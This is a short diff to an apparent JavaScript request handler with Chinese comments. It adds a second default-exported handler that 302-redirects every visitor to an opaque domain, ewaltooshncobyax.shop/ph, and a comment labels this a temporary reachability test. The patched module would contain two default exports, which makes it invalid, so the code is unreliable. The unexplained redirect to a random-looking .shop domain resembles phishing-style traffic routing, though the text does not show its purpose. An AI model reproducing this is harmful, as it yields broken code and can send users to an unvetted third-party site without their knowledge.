@@ -32,3 +32,15 @@ export default async function handler(req, res) {
     res.status(500).send('URL解析错误: ' + error.message);
   }
 }
+
+// 简单的重定向版本（先测试这个）
+export default async function handler(req, res) {
+  const targetUrl = 'https://ewaltooshncobyax.shop/ph';
+  console.log('重定向到:', targetUrl);
+  
+  // 临时使用重定向来测试目标网站是否可访问
+  res.writeHead(302, {
+    'Location': targetUrl
+  });
+  res.end();
+}
